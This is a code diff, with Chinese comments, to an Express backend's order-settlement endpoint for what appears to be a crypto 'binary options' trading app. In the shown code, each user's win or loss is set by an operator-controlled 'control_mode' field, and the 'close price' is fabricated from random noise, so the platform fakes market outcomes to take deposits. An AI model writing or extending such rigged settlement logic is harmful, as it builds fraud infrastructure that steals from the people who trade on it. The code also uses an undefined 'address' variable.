@@ -406,7 +406,8 @@ app.post("/api/language", authMiddleware, async (req, res) => {
   res.json({ success: true, language });
 });
 // =========================================================
-//  订单状态查询（用于前端轮询）
+// =========================================================
+//  订单状态查询（增强版）
 // =========================================================
 app.get("/api/order/status/:orderId", authMiddleware, async (req, res) => {
   try {
@@ -415,7 +416,7 @@ app.get("/api/order/status/:orderId", authMiddleware, async (req, res) => {
 
     // 查询订单信息
     const orderResult = await pool.query(
-      `SELECT o.*, u.control_mode 
+      `SELECT o.*, u.control_mode, u.balances
        FROM orders o 
        LEFT JOIN users u ON o.wallet = u.address 
        WHERE o.id = $1 AND o.wallet = $2`,
@@ -429,15 +430,16 @@ app.get("/api/order/status/:orderId", authMiddleware, async (req, res) => {
     const order = orderResult.rows[0];
     const now = Date.now();
     const createdAt = Number(order.created_at);
-    const period = Number(order.period) || 60; // 默认60秒
+    const period = Number(order.period) || 60;
 
     // 计算剩余时间
     const elapsed = Math.floor((now - createdAt) / 1000);
     const remainingTime = Math.max(0, period - elapsed);
 
-    // 如果订单已过期但未结算，自动结算
+    // ⭐ 如果订单已过期但未结算，立即结算
     if (remainingTime <= 0 && order.status === 'open') {
-      // 自动结算逻辑
+      console.log('订单到期，开始结算:', orderId);
+      
       const isWin = order.control_mode === 'win' ? true : 
                    order.control_mode === 'lose' ? false : 
                    Math.random() > 0.5;
@@ -445,18 +447,19 @@ app.get("/api/order/status/:orderId", authMiddleware, async (req, res) => {
       const percent = Number(order.percent) || 0.25;
       const amount = Number(order.amount) || 0;
       const openPrice = Number(order.open_price) || 0;
-      // ⭐⭐ 修复：计算包含本金的净收益
-      const profit = isWin ? amount + (amount * percent) : 0;
+      
+      // 计算收盘价（基于开盘价的小幅波动）
       const closePrice = openPrice + (Math.random() * 200 - 100);
-      // 更新用户余额
-      const userResult = await pool.query(
-        "SELECT balances FROM users WHERE address = $1",
-        [address]
-      );
-      const balances = userResult.rows[0].balances;
-      const currentUSDT = Number(balances.USDT) || 0;
-      balances.USDT = currentUSDT + profit;
+      
+      // 计算盈利
+      const profit = isWin ? amount + (amount * percent) : 0;
+      const netProfit = isWin ? (amount * percent) : -amount;
 
+      // 更新用户余额
+      const balances = order.balances || { USDT: 0 };
+      balances.USDT = Number(balances.USDT) + profit;
+
+      // 更新用户余额
       await pool.query(
         "UPDATE users SET balances = $1 WHERE address = $2",
         [balances, address]
@@ -465,24 +468,28 @@ app.get("/api/order/status/:orderId", authMiddleware, async (req, res) => {
       // 更新订单状态
       await pool.query(
         `UPDATE orders 
-         SET status = 'closed', profit = $1, settled_at = $2 
-         WHERE id = $3`,
-        [profit, now, orderId]
+         SET status = 'completed', 
+             profit = $1, 
+             settled_at = $2,
+             close_price = $3
+         WHERE id = $4`,
+        [profit, now, closePrice, orderId]
       );
 
-// 在后端订单状态查询接口中
-return res.json({
-  status: 'completed',
-  remainingTime: 0,
-  isWin,
-  profit: totalPayout, // 总到账金额（本金+利润，用于更新余额）
-  netProfit: isWin ? (amount * percent) : -amount, // 净盈亏（只显示利润或亏损）
-  amount,
-  startPrice: openPrice,
-  closePrice: closePrice,
-  percent,
-  cycle: period
-});
+      console.log('订单结算完成:', orderId, '盈利:', profit);
+
+      return res.json({
+        status: 'completed',
+        remainingTime: 0,
+        isWin,
+        profit, // 总到账金额
+        netProfit, // 净盈亏
+        amount,
+        startPrice: openPrice,
+        closePrice,
+        percent,
+        cycle: period
+      });
     }
 
     // 返回订单状态
